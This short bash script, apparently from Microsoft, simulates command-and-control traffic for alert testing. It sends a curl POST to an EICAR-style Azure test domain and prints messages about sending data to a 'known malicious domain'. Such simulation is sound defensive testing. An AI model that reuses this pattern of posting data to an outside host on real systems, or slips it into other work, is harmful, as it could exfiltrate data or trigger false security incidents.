#!/bin/bash

# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.

echo "--- Threat Intelligence Communication ---"
echo "Sending data to known malicious domain"
curl -s -m 10 -X POST "http://mdc-eicar.alerts.security.azure.com?SendingData" -o /dev/null
echo "C2 communication sequence complete"
echo " "
